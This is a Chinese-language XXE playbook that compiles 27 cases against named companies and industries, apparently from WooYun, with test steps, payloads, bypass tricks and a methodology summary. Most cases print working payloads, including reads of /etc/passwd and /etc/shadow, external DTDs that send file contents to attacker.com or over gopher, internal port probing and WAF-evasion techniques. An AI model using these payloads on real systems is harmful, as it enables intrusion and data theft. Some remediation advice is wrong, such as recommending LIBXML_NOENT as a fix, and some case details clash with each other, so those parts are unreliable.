# XXE案例集

> 整合内部真实漏洞与业界经典案例，提供实战指导

## 一、内部真实案例

暂无内部案例数据

---

## 二、业界经典案例（乌云）

### 案例1：蘑菇街存在XXE漏洞（文档上传SSRF）
**厂商**: 蘑菇街 | **类型**: XXE（docx上传，SSRF）

**洞察**: 文档上传功能解析Office XML文件（docx），XML解析器未禁用外部实体，可通过上传恶意docx实现SSRF，访问内网服务

**测试流程**:
1. 上传docx格式的文件
2. 解压docx，修改word/document.xml
3. 添加外部实体引用内网URL
4. 重新打包为docx上传
5. 从响应中观察外部实体内容

**技术细节**:
docx文件中构造外部实体：`<!DOCTYPE ANY [<!ENTITY xee SYSTEM "http://attacker.com/xxe.htm">]>`，`<w:t>&xee;@domain.com</w:t>`，解析时服务器会访问外部URL

**POC示例**:
```
1. 解压docx文件
2. 修改word/document.xml:
<?xml version="1.0"?>
<!DOCTYPE ANY [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe.htm">
]>
<w:t>&xxe;</w:t>
3. 重新打包为docx上传
```

**绕过技巧**: 通过docx文件格式绕过直接XML检测

**修复建议**: 文档解析时禁用外部实体（`DocumentBuilderFactory.setFeature("http://xml.org/sax/features/external-general-entities", false)`）

---

### 案例2：天翼云一处XXE漏洞可读取任意文件
**厂商**: 某邮箱服务业务支撑中心 | **类型**: XXE（任意文件读取）

**洞察**: 邮件预览服务解析docx文件中的XML，未禁用外部实体，可通过file://协议读取服务器任意文件内容

**测试流程**:
1. 发现文件预览功能
2. 解压docx修改document.xml添加file://实体
3. 上传恶意docx
4. 从预览响应中读取文件内容

**技术细节**:
某邮箱服务文件预览页存在XXE：`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE ANY [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>...<string name="sid">&xxe;</string>`

**POC示例**:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE ANY [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document>
  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>
```

**绕过技巧**: file://协议读取本地文件

**修复建议**: 禁用XML解析器的外部实体处理

---

### 案例3：某运营商某省系统Blind XXE（gopher协议带外）
**厂商**: 某运营商 | **类型**: XXE（盲注，gopher协议带外）

**洞察**: Blind XXE无法直接获取响应，可通过gopher://协议将读取的文件内容带出到攻击者服务器，比HTTP带外更强大

**测试流程**:
1. 发现XML接口
2. 测试基础XXE是否有回显
3. 确认为Blind XXE后构造gopher带外
4. 在攻击者VPS上接收带外数据

**技术细节**:
webservice?wsdl接口，使用远程DTD实现Blind XXE带外，通过gopher://协议将文件内容带出

**POC示例**:
```xml
# 攻击者VPS上的DTD文件（evil.dtd）:
<!ENTITY % a SYSTEM "file:///">
<!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://attacker:80/%a;'>">
%b;
%c;

# 攻击XXE Payload:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
```

**绕过技巧**: gopher协议绕过HTTP-only的SSRF过滤

**修复建议**: 禁用XML外部实体，同时限制XML解析器可访问的协议

---

### 案例4：139邮箱XXE漏洞可读取文件
**厂商**: 10086.cn（139邮箱） | **类型**: XXE（直接文件读取）

**洞察**: 运营商邮箱系统的文件预览接口/opes/preview.do通过sid参数传递XML内容，未过滤外部实体，可直接读取/etc/passwd等系统文件

**测试流程**:
1. 发现preview.do文件预览接口
2. 构造包含file://实体的XML
3. 提交到接口
4. 响应中包含文件内容

**技术细节**:
`/opes/preview.do`通过sid参数接收XML，`<!ENTITY all SYSTEM "file:///etc/passwd">`，响应直接返回文件内容

**POC示例**:
```http
POST /opes/preview.do HTTP/1.1

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE ANY [
  <!ENTITY all SYSTEM "file:///etc/passwd">
]>
...
<string name="sid">&all;</string>
```

**绕过技巧**: 直接file://协议

**修复建议**: 禁用`DocumentBuilderFactory.setExpandEntityReferences(false)`

---

### 案例5：TurboGate邮件网关漏洞合集（axis2 XXE）
**厂商**: turbomail.org | **类型**: XXE（Axis2 WebService，默认配置）

**洞察**: Apache Axis2 <= 1.5.1版本存在XXE漏洞，TurboGate使用了此版本，通过SOAP请求触发XXE，Content-Type设置为application/xml

**测试流程**:
1. 发现目标使用Axis2 WebService
2. 构造含XXE的SOAP请求
3. 设置Content-Type为application/xml
4. 发送请求读取文件

**技术细节**:
Axis2 <= 1.5.1 XXE，SOAP接口：`POST /services/TM_User.TM_UserHttpSoap11Endpoint/` 设置`Content-Type: application/xml`触发XXE

**POC示例**:
```http
POST /services/TM_User.TM_UserHttpSoap11Endpoint/ HTTP/1.0
SOAPAction: "urn:getUserOrgList"
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope>
  <soapenv:Body><foo>&xxe;</foo></soapenv:Body>
</soapenv:Envelope>
```

**绕过技巧**: `Content-Type: application/xml`而非`text/xml`可触发Axis2的XXE

**修复建议**: 升级Axis2到1.5.2+，或升级TurboGate到修复版本

---

### 案例6：某航空公司Blind XXE漏洞（CloudEye带外验证）
**厂商**: xiamenair.com（厦门航空） | **类型**: XXE（Blind，DNS/HTTP带外）

**洞察**: 厦门航空系统存在Blind XXE，通过外部实体引用VPS上的DTD文件，利用Cloudeye等工具验证带外请求

**测试流程**:
1. 发现XML处理接口
2. 构造引用VPS DTD的XXE
3. 通过Cloudeye监听接收带外DNS/HTTP请求
4. 确认XXE后进一步利用

**技术细节**:
在VPS部署DTD，XXE触发后服务器访问VPS：`<!ENTITY % info "test"><!ENTITY % int "<!ENTITY % trick SYSTEM 'http://attacker/?xxe_l=%info;'>">%int;%trick;`

**POC示例**:
```xml
# VPS上的DTD (evil.dtd):
<!ENTITY % info "test_data">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://attacker.com/?data=%info;'>">
%int;
%trick;

# XXE Payload:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
```

**绕过技巧**: DNS带外不依赖HTTP响应

**修复建议**: 禁用外部实体，网络层限制XML解析器的出站连接

---

### 案例7：唯品会存在Blind XXE漏洞（XFire组件文件读取）
**厂商**: 唯品会 | **类型**: XXE（XFire WebService，gopher带外）

**洞察**: 唯品会使用XFire WebService组件，该组件使用STAX解析XML导致XXE，通过gopher://协议可带外读取文件内容

**测试流程**:
1. 发现XFire WebService接口
2. 构造gopher带外XXE
3. 在VPS上监听gopher连接
4. 接收读取的文件内容

**技术细节**:
XFire使用STAX解析XML，存在XXE。通过gopher://协议带外：`<!ENTITY % a SYSTEM "file:///"><!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://ip:port/?%a;'>">%b;%c;`

**POC示例**:
```xml
# DTD file (list.xml):
<!ENTITY % a SYSTEM "file:///etc/passwd">
<!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://attacker:8080/?%a;'>">
%b;
%c;

修复建议：升级XFire为Apache CXF
```

**绕过技巧**: gopher协议绕过只检查HTTP的出站限制

**修复建议**: 升级XFire为Apache CXF，禁用外部实体

---

### 案例8：搜狗某站文件读取/列目录（Java环境Blind XXE）
**厂商**: 搜狗 | **类型**: XXE（Java环境，列目录）

**洞察**: Java环境的XXE特殊之处：使用file:///目录可列举目录内容而非只读文件，搜狗通过Accesslog验证带外请求

**测试流程**:
1. 发现Java Web服务接收XML
2. 构造file:///列目录的XXE
3. 通过带外获取目录列表
4. 定位敏感文件后再读取文件内容

**技术细节**:
Java中file:///可用于列目录，通过Accesslog验证XXE存在

**POC示例**:
```xml
# 列出/etc目录:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/">
]>
<root>&xxe;</root>

# Java特性：目录会被列举出来，文件内容会被读取
```

**绕过技巧**: Java XML解析器在file://目录时列举文件列表

**修复建议**: 设置`XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES=false`

---

### 案例9：Discuz! XXE可破坏数据库结构（文件导入功能）
**厂商**: Discuz! | **类型**: XXE（CMS门户主题XML导入）

**洞察**: Discuz的门户DIY功能允许导入XML配置文件，若导入恶意XML可注入外部实体，不只用于信息读取，还可向数据库注入脏数据

**测试流程**:
1. 登录Discuz管理后台
2. 在门户DIY功能中导入XML
3. 上传包含XXE实体的XML
4. 观察数据库中是否存在脏数据

**技术细节**:
`portalcp_diy.php`处理导入XML：`$filename = DISCUZ_ROOT.'./template/default/portal/diyxml/'.$_POST['importfilename'].'.xml'`，未过滤XXE

**POC示例**:
```http
POST /portalcp.php?op=diy&do=import HTTP/1.1

恶意XML文件内容:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<config>&xxe;</config>
```

**绕过技巧**: 管理后台功能可绕过某些前台防护

**修复建议**: 使用`LIBXML_NOENT`禁用外部实体，或使用安全的DOM解析器

---

### 案例10：唯品会某系统存在远程XXE读取任意文件（XFire+evil.dtd）
**厂商**: 唯品会 | **类型**: XXE（XFire，DTD+SEND带外）

**洞察**: 通过组合DTD文件实现XXE文件内容的带外传输：evil.dtd定义send实体，list.xml实现文件读取和带外发送

**测试流程**:
1. 识别目标使用XFire/汉启邮件系统
2. 在VPS部署evil.dtd
3. 发送XXE触发Payload引用evil.dtd
4. evil.dtd中的SEND实体将文件内容发送到VPS

**技术细节**:
两层DTD嵌套：evil.dtd定义%all和%send实体；list.xml读取本地文件并通过HTTP发送到攻击者服务器

**POC示例**:
```xml
# evil.dtd (VPS上):
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all
  "<!ENTITY &#x25; send SYSTEM 'http://attacker/?%file;'>">
%all;

# list.xml (VPS上):
<!ENTITY % a SYSTEM "file:///etc/passwd">
<!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://attacker:port/?%a;'>">
%b;
%c;
```

**绕过技巧**: 多层DTD嵌套绕过单层XXE过滤

**修复建议**: 禁用外部实体，升级XFire为CXF

---

### 案例11：驴妈妈旅游网某业务系统存在XXE漏洞（XFire组件）
**厂商**: 驴妈妈旅游网 | **类型**: XXE（XFire WebService）

**洞察**: 旅游业务系统使用XFire WebService，存在与唯品会相同的XXE漏洞，利用evil.dtd进行带外文件读取

**测试流程**:
1. 发现XFire WebService接口
2. 部署evil.dtd到攻击者VPS
3. 发送XXE Payload
4. 接收带外数据

**技术细节**:
XFire组件XXE，利用方式参考唯品会案例

**POC示例**:
```xml
与唯品会XFire XXE相同的利用方式

# evil.dtd:
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://remote_ip/?%file;'>">
%all;
```

**绕过技巧**: 无（未记录绕过技巧）

**修复建议**: 升级XFire为Apache CXF，禁用XML外部实体

---

### 案例12：中通某处XXE漏洞可读取服务器任意文件（移动端反编译发现）
**厂商**: 中通速递 | **类型**: XXE（移动端接口，带外验证）

**洞察**: 通过反编译快递公司Android客户端发现隐藏的XML接口，该接口存在XXE，展示了移动端逆向分析发现服务端漏洞的思路

**测试流程**:
1. 反编译中通Android客户端
2. 发现隐藏的XML提交接口
3. 构造XXE Payload提交
4. 通过VPS验证带外请求

**技术细节**:
反编译中天系统客户端发现XML接口，提交evil.dtd触发服务器请求，验证XXE存在

**POC示例**:
```http
# 客户端代码中的XML接口
POST /xmlservice HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">%dtd;]>
<request><data>&exfil;</data></request>
```

**绕过技巧**: 移动端接口通常无WAF防护

**修复建议**: 禁用XML外部实体，移动端接口同样需要安全审查

---

### 案例13：用友某站root权限XXE
**厂商**: 用友软件 | **类型**: XXE（用友ERP系统，root权限）

**洞察**: 用友ERP系统XML接口以root权限运行，XXE读取文件时具有root权限，可读取所有系统文件

**测试流程**:
1. 发现用友ERP的XML接口
2. 构造XXE读取/etc/shadow
3. 以root权限读取敏感文件

**技术细节**:
用友某站XXE，服务以root权限运行，XXE可读取所有系统文件

**POC示例**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<request>&xxe;</request>
```

**绕过技巧**: root权限无文件读取限制

**修复建议**: 禁用XXE，应用遵循最小权限原则不使用root运行

---

### 案例14：某证券通用文件遍历读取（涉及大量证券公司，ubsiServlet接口）
**厂商**: 证券行业通用系统 | **类型**: XXE（通用证券系统，大量受影响）

**洞察**: 证券行业广泛使用的ubsiServlet接口存在XXE，通过GET请求XML参数直接触发，影响十余家证券公司

**测试流程**:
1. 发现ubsiServlet接口
2. 构造GET方式的XXE参数
3. 读取服务器文件

**技术细节**:
ubsiServlet接口：`/ubsiServlet?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]><ubsi service="service" method="method"><object type="Integer">%26xxe;</object></ubsi>`，GET方式触发

**POC示例**:
```http
GET /ubsiServlet?xml=%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E%3Cubsi%3E%26xxe;%3C/ubsi%3E HTTP/1.1
```

**绕过技巧**: URL编码绕过WAF对`<!DOCTYPE`的检测

**修复建议**: 修复XXE，不必要的接口对外屏蔽

---

### 案例15：某证券公司root权限XXE漏洞
**厂商**: 某证券公司 | **类型**: XXE（金融机构，root权限）

**洞察**: 证券公司XML接口以root权限运行，XXE可读取任意系统文件，金融机构的安全风险极高

**测试流程**:
1. 发现证券公司XML接口
2. 构造XXE读取敏感文件
3. 以root权限获取系统信息

**技术细节**:
证券公司XML接口root权限XXE，可读取任意文件

**POC示例**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<req>&xxe;</req>
```

**绕过技巧**: 无（未记录绕过技巧）

**修复建议**: 禁用外部实体，降低运行权限，隔离XML处理服务

---

### 案例16：101远程教育网某分站存在Blind XXE（XFire组件）
**厂商**: cncert国家互联网应急中心 | **类型**: XXE（Blind，XFire WebService）

**洞察**: 教育系统使用的live800在线客服系统底层使用XFire，存在Blind XXE，可通过live800的WebService接口触发

**测试流程**:
1. 发现live800服务的WSDL接口
2. 构造Blind XXE Payload
3. 通过带外确认漏洞
4. 读取服务器文件

**技术细节**:
`live800/services/IVerification?wsdl`接口存在Blind XXE

**POC示例**:
```http
POST /live800/services/IVerification HTTP/1.1
Content-Type: text/xml

[XXE Payload参考XFire模式]
```

**绕过技巧**: 无（未记录绕过技巧）

**修复建议**: 升级live800，禁用XFire外部实体

---

### 案例17：易方达基金某系统存在Blind XXE漏洞
**厂商**: 某基金公司 | **类型**: XXE（Blind，金融基金）

**洞察**: 基金公司系统存在Blind XXE，金融机构内网信息敏感，XXE可探测内网结构

**测试流程**:
1. 发现基金系统XML接口
2. 构造Blind XXE
3. 通过VPS接收带外数据

**技术细节**:
Blind XXE，需通过DNS/HTTP带外获取数据

**POC示例**:
```xml
标准Blind XXE Payload，通过外部DTD实现带外
```

**绕过技巧**: 无（未记录绕过技巧）

**修复建议**: 禁用XML外部实体处理

---

### 案例18：人人网某分站存在Blind XXE漏洞（配合任意文件下载）
**厂商**: 人人网 | **类型**: XXE（Blind，配合文件下载漏洞）

**洞察**: 人人网分站同时存在Blind XXE和任意文件下载，两个漏洞可组合利用，展示了漏洞组合攻击的思路

**测试流程**:
1. 发现Blind XXE漏洞
2. 同时发现任意文件下载漏洞
3. 通过XXE列出目录获取文件名
4. 通过任意文件下载获取文件内容

**技术细节**:
同时存在Blind XXE和任意文件下载，可组合使用

**POC示例**:
```
XXE列目录 + 任意文件下载读取内容的组合利用
```

**绕过技巧**: 组合漏洞绕过单个漏洞的限制

**修复建议**: 分别修复XXE和任意文件下载漏洞

---

### 案例19：pull-in任意文件遍历/下载（xmlrpc XXE）
**厂商**: pull-in | **类型**: XXE（XML-RPC接口）

**洞察**: XML-RPC接口解析methodName时存在XXE，可通过外部实体读取文件内容，是早期经典XXE利用场景

**测试流程**:
1. 发现XML-RPC接口
2. 在methodCall/methodName中注入外部实体
3. 读取服务器文件

**技术细节**:
XML-RPC中构造：`<!ENTITY xxe SYSTEM "file:///etc/passwd" >`，`<methodName>&xxe;</methodName>`

**POC示例**:
```http
POST /xmlrpc HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT methodName ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<methodCall>
  <methodName>&xxe;</methodName>
</methodCall>
```

**绕过技巧**: XML-RPC接口通常无WAF防护

**修复建议**: 升级到修复版本（2.0 RC2/2.0 beta5），禁用外部实体

---

### 案例20：某互联网公司示例代码XXE（simplexml_load_string PHP）
**厂商**: 某互联网公司（公众平台） | **类型**: XXE（PHP simplexml_load_string）

**洞察**: 某互联网公司开放平台的PHP示例代码使用simplexml_load_string解析XML，未禁用外部实体，导致使用该示例代码的第三方网站均存在XXE漏洞

**测试流程**:
1. 识别使用某互联网公司开放平台的网站
2. 构造包含外部实体的XML POST请求
3. 读取服务器任意文件

**技术细节**:
示例代码：`$postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA)` 使用LIBXML_NOCDATA但未禁用外部实体

**POC示例**:
```http
POST /wechat/callback HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<xml><ToUserName><![CDATA[test]]></ToUserName><Content>&xxe;</Content></xml>
```

**绕过技巧**: LIBXML_NOCDATA不等于禁用外部实体

**修复建议**: 使用`LIBXML_NOENT|LIBXML_DTDLOAD=0`，或添加`libxml_disable_entity_loader(true)`

---

### 案例21：金山游戏存在Blind XXE漏洞
**厂商**: 金山网络 | **类型**: XXE（Blind，游戏公司）

**洞察**: 金山游戏系统存在Blind XXE，内含游戏用户数据和内部系统，风险极高

**测试流程**:
1. 发现金山系统XML接口
2. 构造Blind XXE
3. 通过VPS DNS/HTTP接收带外数据

**技术细节**:
Blind XXE，使用%info和%trick参数实现带外数据提取

**POC示例**:
```xml
# DTD:
<!ENTITY % info "game_data">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://attacker/?xxe_l=%info1;'>">
%int;
%trick;
```

**绕过技巧**: 无（未记录绕过技巧）

**修复建议**: 禁用XML外部实体

---

### 案例22：安利中国存在Blind XXE漏洞
**厂商**: amway.com.cn | **类型**: XXE（Blind，零售企业）

**洞察**: 安利中国直销系统存在Blind XXE，零售/直销公司通常有大量客户和订单数据，XXE可探测和获取这些数据

**测试流程**:
1. 发现安利XML接口
2. 构造Blind XXE触发DNS/HTTP带外
3. 通过VPS验证并进一步利用

**技术细节**:
使用CloudEye等工具验证Blind XXE：在VPS部署DTD，收到回调日志确认漏洞

**POC示例**:
```xml
# 使用CloudEye验证:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://cloudeye.com/your_token">
  %remote;
]>
```

**绕过技巧**: 无（未记录绕过技巧）

**修复建议**: 禁用外部XML实体解析

---

### 案例23：长安汽车存在Blind XXE漏洞
**厂商**: 某汽车公司 | **类型**: XXE（Blind，汽车行业）

**洞察**: 汽车企业系统存在Blind XXE，汽车企业内网通常包含研发数据、供应链信息等敏感数据

**测试流程**:
1. 发现汽车系统XML接口
2. 构造Blind XXE
3. 验证漏洞存在后获取内网信息

**技术细节**:
Blind XXE，通过VPS接收%info数据

**POC示例**:
```xml
标准Blind XXE Payload，参考友盟/安利案例
```

**绕过技巧**: 无（未记录绕过技巧）

**修复建议**: 禁用外部XML实体

---

### 案例24：wemall某开源PHP商城Blind XXE（无需登录，附POC）
**厂商**: www.inuoer.com（wemall商城） | **类型**: XXE（无需登录，PHP微信接口）

**洞察**: 开源PHP商城wemall 3.3的微信接口使用simpleXML解析POST数据，未禁用外部实体，无需登录即可触发XXE

**测试流程**:
1. 访问/WechatAction/init接口
2. 构造包含XXE的XML POST请求
3. 无需认证即可读取文件

**技术细节**:
`WechatAction.class.php`中使用simplexml解析微信XML消息，无认证，存在Blind XXE

**POC示例**:
```http
POST /WechatAction/init HTTP/1.1
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">%xxe;]><xml></xml>
```

**绕过技巧**: PHP microCMS类的接口通常无认证

**修复建议**: 添加`libxml_disable_entity_loader(true)`，或使用`LIBXML_NONET`标志

---

### 案例25：企业航旅通业务销售平台客户端XML注入（泄露全站用户数据）
**厂商**: rtpnr.com | **类型**: XXE（客户端XML，SQL注入）

**洞察**: 航旅通客户端通过SOAP接口传递XML数据，XML参数中同时存在SQL注入漏洞，展示了通过逆向客户端发现服务端漏洞的思路

**测试流程**:
1. 下载并逆向分析客户端
2. 抓取登录时的SOAP请求
3. 在参数中添加*号触发sqlmap检测
4. 提取全站用户数据库

**技术细节**:
客户端登录抓包，参数加*号跑出14个数据库，包含B2C_02库的User表（百万订单）

**POC示例**:
```http
POST /AOIS/YSTA.asmx HTTP/1.1
SOAPAction: "http://tempuri.org/GetLogin"
Content-Type: text/xml

<SOAP:Envelope><SOAP:Body><GetLogin><username>test*</username></GetLogin></SOAP:Body></SOAP:Envelope>
```

**绕过技巧**: SOAP参数注入绕过普通HTTP参数的WAF

**修复建议**: 使用参数化查询防SQL注入，XML接口禁用外部实体

---

### 案例26：某门户网站焦点主站Blind XXE（file协议被禁，端口探测）
**厂商**: 某门户网站 | **类型**: XXE（Blind，file协议禁用，端口时间探测）

**洞察**: 当file://、data://等协议被禁用时，Blind XXE仍可通过HTTP协议探测内网端口：SSH等端口开放时响应时间长，关闭时响应时间短

**测试流程**:
1. 确认存在Blind XXE（通过CloudEye验证）
2. 尝试file://、data://等协议均无回显
3. 改用HTTP协议探测内网端口
4. 通过响应时间差异判断端口开放情况

**技术细节**:
Blind XXE禁用file/data协议，通过HTTP探测端口时间差：SSH开放→请求时间长，SSH关闭→时间短

**POC示例**:
```xml
# 探测本机22端口（SSH）:
<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">

# DTD:
<!ENTITY % data SYSTEM "http://127.0.0.1:22/">
<!ENTITY % out "<!ENTITY &#37; leak SYSTEM 'http://attacker/?x=%data;'>">
%out;
%leak;
```

**绕过技巧**: HTTP协议探测端口状态，不依赖file/data等受限协议

**修复建议**: 禁用所有外部实体，网络层限制XML解析器的出站连接

---

### 案例27：盛大某站文件读取/列目录（Java环境Blind XXE）
**厂商**: 盛大游戏 | **类型**: XXE（Java，列目录+带外）

**洞察**: 盛大游戏系统的Java XXE，Java环境特有的目录列举功能使得攻击者可以先列目录找到敏感文件，再精确读取

**测试流程**:
1. 发现Java XML接口
2. 使用file:///目录列举
3. 定位敏感配置文件路径
4. 读取文件内容

**技术细节**:
Java XXE可列目录，先列/找到配置文件路径，再读取内容

**POC示例**:
```xml
# 列目录:
<!ENTITY xxe SYSTEM "file:///etc/">

# 读取文件:
<!ENTITY xxe SYSTEM "file:///etc/tomcat/tomcat-users.xml">
```

**绕过技巧**: Java file://列目录特性

**修复建议**: `XMLInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false)`

---

## 三、方法论总结

### 3.1 高频参数统计

| 参数/接口特征 | 出现频次 | 说明 |
|--------------|----------|------|
| `file:///etc/passwd` | 15+ | 最常见的文件读取目标，验证XXE是否有效 |
| `file:///etc/shadow` | 3+ | 需要root权限的高价值目标 |
| `?wsdl` / WebService端点 | 8+ | WSDL接口是XXE高发区域（Axis2、XFire、CXF） |
| `file:///目录/` | 5+ | Java环境下列目录，用于路径探测 |
| `http://attacker/evil.dtd` | 12+ | Blind XXE的标准带外DTD引用 |
| `gopher://attacker:port/` | 4+ | 需要绕过HTTP-only限制时使用 |
| `sid` / `xml` / `content` | 多次 | XML内容通过这些参数传递 |
| `methodName`（XML-RPC） | 2+ | XML-RPC接口中的注入点 |

### 3.2 攻击模式分布

| 攻击模式 | 案例数量 | 典型代表 |
|----------|----------|----------|
| 有回显XXE（直接文件读取） | 6个 | 139邮箱、天翼云、ubsiServlet证券系统 |
| Blind XXE（HTTP/DNS带外） | 10个 | 安利、长安汽车、易方达基金、金山游戏 |
| Blind XXE（gopher带外） | 3个 | 唯品会、某运营商省系统 |
| docx/Office文件上传触发 | 2个 | 蘑菇街、天翼云 |
| XFire WebService组件 | 4个 | 唯品会(×2)、驴妈妈、101教育 |
| Axis2 WebService组件 | 1个 | TurboGate邮件网关 |
| XML-RPC接口 | 1个 | pull-in |
| PHP simplexml系列 | 2个 | 某互联网公司示例代码、wemall商城 |
| Java列目录特性 | 2个 | 搜狗、盛大游戏 |
| root权限放大危害 | 2个 | 用友ERP、某证券公司 |
| 移动端反编译发现 | 1个 | 中通速递 |
| 漏洞组合利用 | 1个 | 人人网（XXE + 任意文件下载） |
| 端口扫描/内网探测 | 1个 | 某门户网站焦点主站 |

### 3.3 关键检测信号

**接口特征**:
- 接受XML格式请求体（`Content-Type: text/xml` 或 `application/xml`）
- 存在 `?wsdl` 端点的WebService（Axis2、XFire、CXF）
- XML-RPC接口（`/xmlrpc`、`/xmlrpc.php`）
- 文档上传功能（docx、xlsx、pptx等Office格式）
- 微信/第三方平台回调接口（常用simplexml解析）

**响应特征**:
- 响应中出现系统文件内容（`/etc/passwd`格式内容）
- 响应时间明显延长（Blind XXE中HTTP连接目标端口）
- 服务器向VPS发起DNS/HTTP请求（带外确认）
- 500错误中携带文件路径信息

**代码审计信号**:
- Java：`DocumentBuilderFactory` 未调用 `setFeature` 禁用外部实体
- Java：`XMLInputFactory` 未设置 `IS_SUPPORTING_EXTERNAL_ENTITIES=false`
- PHP：`simplexml_load_string` / `SimpleXMLElement` 未添加 `LIBXML_NOENT=0`
- PHP：未调用 `libxml_disable_entity_loader(true)`
- Python：`etree.parse()` / `etree.fromstring()` 使用默认解析器
- 使用 XFire（应升级为 Apache CXF）
- 使用 Axis2 <= 1.5.1

### 3.4 常见绕过技巧

| 绕过技巧 | 适用场景 | 原理与要点 |
|----------|----------|------------|
| docx/Office文件封装 | 文件上传检测 | Office格式本质是ZIP压缩XML，修改内部XML可绕过文件类型检测 |
| URL编码`<!DOCTYPE` | WAF关键词过滤 | `%3C!DOCTYPE`绕过对明文`<!DOCTYPE`的检测 |
| gopher协议带外 | HTTP-only SSRF过滤 | gopher可发送任意TCP数据，不受HTTP协议限制 |
| 参数实体嵌套DTD | 单层XXE过滤 | 多层`%`实体嵌套实现复杂带外逻辑 |
| Content-Type切换 | Axis2触发条件 | `application/xml`而非`text/xml`触发Axis2特定XXE路径 |
| Java列目录特性 | 不知道文件名时 | Java的`file:///目录/`返回目录列表，其他语言不支持 |
| HTTP端口时间探测 | file/data协议被禁 | 通过HTTP连接内网端口的响应时间差判断端口开放状态 |
| 移动端接口（无WAF） | WAF绕过 | 移动端API通常不经过Web应用防火墙 |
| DNS带外（不依赖HTTP响应） | HTTP出站被拦截 | DNS查询穿透防火墙的能力比HTTP更强 |
| 组合漏洞（XXE+文件下载） | 单漏洞利用受限 | XXE列目录获取文件名，任意文件下载读取内容 |
